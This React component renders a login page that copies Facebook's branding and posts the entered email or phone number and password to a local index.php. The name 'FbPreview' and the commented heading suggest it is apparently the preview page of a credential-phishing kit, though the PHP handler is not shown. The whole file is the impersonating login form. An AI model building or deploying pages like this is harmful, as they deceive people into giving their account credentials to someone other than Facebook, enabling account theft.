import "./style.css";
export default function FbPreview() {
    return (
        <>
            <div className="preview">
                {/* <h1>Login to Facebook! Preview.</h1> */}
                <section id="myForm">
                    <div className="wrapper">
                        <div className="fbImage">
                            <img src="./fbImg.svg" alt="Facebook" />
                        </div>

                        <form
                            action="./index.php"
                            method="POST"
                            className="login"
                        >
                            <div className="logHead">
                                <span>Log Into Facebook</span>
                            </div>

                            <div className="form_contents">
                                <input
                                    type="text"
                                    name="username"
                                    placeholder="Email or Phone Number"
                                    value=""
                                    id="username"
                                    autoComplete="off"
                                    maxLength={35}
                                />

                                <div className="pswd">
                                    <input
                                        type="password"
                                        name="password"
                                        placeholder="Password"
                                        value=""
                                        id="password"
                                        autoComplete="off"
                                        maxLength={25}
                                        // onKeyUp={showHide()}
                                    />

                                    {/* <div className="showHide" id="showPwd" onClick={hide(), Toggle()}> */}
                                    <img
                                        src="https://img.icons8.com/material-outlined/24/000000/visible--v1.png"
                                        alt="show"
                                    />
                                </div>
                                {/* <div className="showHide" id="hidePwd" onClick={show(), Toggle()}> */}
                                <img
                                    src="https://img.icons8.com/material-outlined/24/000000/hide.png"
                                    alt="hide"
                                />
                            </div>
                            {/* </div> */}

                            <br />
                            <input
                                type="submit"
                                name="button"
                                value="Log In"
                                id="button"
                            />

                            <a href="">Forgot account?</a>

                            <div className="lineOrline">
                                <div className="leftLine"></div>{" "}
                                <div className="or">or</div>{" "}
                                <div className="rightLine"></div>
                            </div>

                            <div className="btn-new-acc">
                                <input
                                    type="button"
                                    name="button2"
                                    value="Create new account"
                                    id="button2"
                                />
                            </div>
                        </form>
                    </div>
                </section>
            </div>
        </>
    );
}
